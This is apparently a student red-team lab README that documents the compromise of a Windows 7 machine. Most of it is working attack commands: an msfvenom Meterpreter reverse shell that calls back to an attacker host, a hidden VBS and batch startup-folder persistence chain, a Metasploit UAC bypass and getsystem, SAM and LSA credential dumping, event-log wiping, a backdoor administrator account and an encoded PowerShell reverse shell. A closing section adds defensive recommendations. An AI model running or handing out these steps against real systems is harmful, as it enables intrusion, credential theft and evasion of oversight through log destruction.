# AN0NYM0US-INDIA-Internship

## 🛡️ Windows 7 Privilege Escalation & Persistence Assessment
🔴 **Red Team Post-Exploitation Lab** | 🔐 **Privilege Escalation** | 🎯 **Persistence Engineering**

A complete security assessment of a legacy Windows 7 environment focused on persistence mechanisms, privilege boundaries, User Account Control (UAC) bypass concepts, and post-exploitation troubleshooting.

## 📖 Executive Summary
Legacy operating systems remain one of the most valuable targets for attackers due to outdated security controls, unsupported software components, and weaker privilege separation mechanisms. In this assessment, a Windows 7 Ultimate SP1 system was evaluated from a post-exploitation perspective. 

The engagement focused on:
* 🔍 Enumerating persistence opportunities
* 🔑 Evaluating administrative privilege boundaries
* ⚡ Investigating UAC-related restrictions
* 🎯 Testing privilege escalation paths
* 🧩 Troubleshooting operational roadblocks
* 🛠️ Building a startup-based persistence framework

The objective was to understand how an attacker could transition from an initial foothold to sustained access while documenting defensive observations throughout the process.

## 🎯 Assessment Objectives
**Primary Goals:**
* 🔎 Assess local privilege separation and accessible services.
* 🔐 Evaluate UAC effectiveness and token filtering.
* 🧠 Study local privilege escalation opportunities to obtain high-integrity access.
* 🚀 Design controlled persistence mechanisms via Windows startup.
* 🛠️ Troubleshoot real-world operational issues.
* 📚 Improve understanding of Windows internals, defense evasion, and credential harvesting.

## 🧪 Lab Environment
| Component | Details |
| :--- | :--- |
| 🎯 **Target Hostname** | BITCH-PC |
| 🎯 **Target OS** | Windows 7 Ultimate SP1 |
| 🎯 **Target IP** | 192.168.31.15 |
| ⚔️ **Assessment Platform** | Kali Linux (192.168.31.54) |
| 🧰 **Frameworks/Tools** | Metasploit, Impacket, Nmap |
| 💣 **Payload Generation** | msfvenom, PowerShell, VBScript |

---

## ⚔️ Phase 1: Initial Enumeration & Environment Discovery
**MITRE ATT&CK Mapping:** `T1046: Network Service Discovery`, `T1021.002: SMB/Windows Admin Shares`

Before attempting persistence or escalation, the environment was analyzed to identify accessible resources and potential execution paths. 

### 🔍 Activities Performed
* **Connectivity Validation:** Confirmed communication between the attacker and target systems.
* **SMB Enumeration:** Reviewed available shares and user-accessible resources using Impacket.
* **User Profile Analysis:** Enumerated writable directories and startup locations.

### 💻 Commands Used
**Target Port Enumeration:**
```bash
nmap -p- 192.168.31.15
```

(Discovered open ports including 135, 139, 445)

User & Share Enumeration via Impacket:

```Bash
impacket-samrdump BITCH@192.168.31.15
impacket-smbclient BITCH@192.168.31.15
```
DOS

---
```cmd
# shares
# use Users
# cd BITCH\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```
💡 Key Discovery: Write permissions within the user's Startup directory were confirmed. This finding created a potential persistence vector whereby files placed within the startup path could automatically execute when the user logged in.

---
## ⚔️ Phase 2: Persistence Framework Engineering
MITRE ATT&CK Mapping: T1547.001: Registry Run Keys / Startup Folder, T1059.005: Visual Basic

With a persistence location identified, a three-stage execution chain was developed. The objective was to automatically execute a hidden payload whenever a user authenticated to the system.

- 🏗️ Persistence Architecture
- 📜 launch.vbs: A hidden VBScript launcher placed in the Startup folder.
- 📜 test.bat: A batch execution wrapper used to launch the payload.
- 💣 payload.exe: A Meterpreter executable generated using msfvenom.

---

💻 Commands Used
Generate Payload:

```Bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.54 LPORT=8888 -f exe > payload.exe
```

---
VBS Launcher (launch.vbs):

```bash
VBScript
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "cmd.exe /c ""C:\Users\BITCH\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\test.bat""", 0, False
```
Batch Controller (test.bat):

---
DOS
```bash
@echo off
"C:\Users\BITCH\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\payload.exe"
```

---
## ⚔️ Phase 3: Callback Validation
MITRE ATT&CK Mapping: T1059.003: Windows Command Shell

The persistence framework was tested to determine whether payload execution occurred successfully after user interaction. A listener was configured, and a successful callback session was established.

💻 Commands Used
Create Listener:

```Bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.31.54
set LPORT 8888
exploit
```
Meterpreter Session Validation:

Code snippet
```
meterpreter > getuid
```
Server username: BITCH-PC\BITCH
```
meterpreter > background
```

---
## 🧩 Operational Challenges & Troubleshooting
One of the most valuable aspects of this assessment was overcoming multiple environmental and platform-specific obstacles.

> 🚧 Challenge 1: Administrative Access Denied (System Error 5)
```
Problem: Attempts to create local accounts failed.

Root Cause: The session operated under a filtered UAC token lacking sufficient privileges.
```
> 🚧 Challenge 2: Legacy OS Limitations
```
Problem: Modern escalation techniques (like fodhelper.exe) were unavailable.

Resolution: A Windows 7-compatible token-duplication UAC bypass method was selected.
```
> 🚧 Challenge 3: File Transfer & Pathing Issues
```
Problem: Payload deployment initially failed due to working-directory mismatches.

Resolution: Explicit paths were mapped out and verified via SMB.
```
> 🚧 Challenge 4: Port Binding Conflicts
```
Problem: Metasploit handlers experienced socket conflicts.

Resolution: Active listeners were shifted to alternative ports (e.g., 5555).
```

---
## ⚔️ Phase 4: Privilege Escalation Assessment
MITRE ATT&CK Mapping: T1548.002: Bypass User Account Control, T1134.001: Token Impersonation/Theft

Following successful persistence validation, a token-duplication UAC bypass technique was executed. The exploit leveraged trusted COM interfaces to obtain a high-integrity access token.

💻 Commands Used
UAC Bypass Execution:

```Bash
msfconsole
use exploit/windows/local/bypassuac
set session 1
set LPORT 5555
run
```
Obtaining High-Integrity SYSTEM Access:

Code snippet
```
meterpreter > getsystem
```
... got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```
meterpreter > getuid
```
Server username: NT AUTHORITY\SYSTEM

---
## ⚔️ Phase 5: Post-Exploitation & Defensive Evasion
MITRE ATT&CK Mapping: T1055: Process Injection, T1003.002: Security Account Manager, T1070.001: Clear Windows Event Logs

To simulate an advanced threat actor removing forensic artifacts and securing session stability, advanced post-exploitation techniques were executed.

💻 Commands Used
Process Migration (Evasion & Stability):

Code snippet
```bash
meterpreter > ps
meterpreter > migrate 2036
[*] Migrating from 3456 to 2036...
[*] Migration completed successfully.
```
(Injected into the user's explorer.exe process)

Credential Extraction (Local SAM & Memory Secrets):

Code snippet
```bash
meterpreter > hashdump
meterpreter > load kiwi
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets
```
(Recovered NTLM hashes, LSA secrets, and DPAPI keys)

Clearing Forensic Tracks:

Code snippet
```bash
meterpreter > clearev
```
(Successfully wiped Application, System, and Security event logs)

---
## ⚔️ Phase 6: Persistence Validation
MITRE ATT&CK Mapping: T1136.001: Local Account Create

After achieving SYSTEM-level compromise, a dedicated administrative account was created and added to the Local Administrators group to validate alternative persistence mechanisms.

💻 Commands Used
Administrative Account Creation:

Code snippet
```bash
meterpreter > shell
C:\Windows\system32>net user ironman jarvis /add
C:\Windows\system32>net localgroup administrators ironman /add
```
(Verification procedures confirmed successful insertion into the administrative security boundary)

---
## ⚙️ Payload Engineering Analysis
MITRE ATT&CK Mapping: T1059.001: PowerShell

During testing, two execution approaches were evaluated. Initial deployment using a plain-text batch execution string failed because the Windows command processor interpreted special characters before execution.

---
## 💻 Direct Execution (Failed)
DOS
```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient..."
```
⚠️ Result: Parsing failures and execution collisions.

## 💻 Encoded Execution (Success)
DOS
```cmd
powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADMAMQAuADUANAAiACwA...
```
✅ Result: Eliminated parsing collisions, preserved command integrity, and increased execution reliability.

---
## 🚨 Security Findings & Recommendations
> Root Causes Identified

🔴 Legacy Operating System: Windows 7 architecture lacks modern memory and credential protections.

🔴 Weak UAC Implementation: Allowed token duplication without secure desktop prompting.

🟠 Unrestricted Startup Folders: Writable startup locations permitted unprivileged payload execution.

🟠 Unrestricted Log Tampering: SYSTEM accounts possessed the ability to destroy primary host-based telemetry.

---
> Defensive Recommendations

🔄 Modernize Legacy Systems: Migrate unsupported operating systems to Windows 10/11.

🔒 Restrict Execution Permissions: Limit write permissions to Startup folder locations for standard users.

🛡️ Implement Credential Guard: Deploy Windows Defender Credential Guard to prevent LSA memory dumping.

📊 Centralize Telemetry: Implement SIEM log forwarding to ensure event logs are preserved if local copies are cleared.

---
## 📂 Project Structure
To maintain a professional repository layout, the project files are organized as follows:

Plaintext
```
Windows7-Privilege-Escalation-Lab/
│
├── README.md
│
├── screenshots/
│   ├── figure-01-network-validation.png
│   ├── figure-02-smb-enumeration.png
│   ├── figure-03-startup-analysis.png
│   ├── figure-04-persistence-design.png
│   ├── figure-05-payload-generation.png
│   ├── figure-06-listener.png
│   ├── figure-07-callback-session.png
│   ├── figure-08-privilege-escalation.png
│   └── figure-09-persistence-validation.png
│
├── payloads/
│   ├── launch.vbs
│   └── test.bat
│
└── docs/
    └── report.pdf
```

---
## 🏁 Conclusion
This assessment successfully demonstrated the progression from restricted user access to full SYSTEM-level control. By mapping the workflow through the lens of detection engineering, the lab provided practical exposure to post-exploitation techniques, legacy OS troubleshooting, privilege escalation concepts, and forensic artifact destruction.

---
## ⚠️ Disclaimer
This project was conducted exclusively within an isolated laboratory environment for educational, research, and defensive security training purposes. No production systems, third-party infrastructure, or unauthorized targets were involved.

---
## ✍️ Author

Abhay

- 🔴 Red Team Operations
- 🛡️ Detection Engineering
- 🧠 Threat Hunting
- ⚡ Offensive Security Research

---
📆 2026
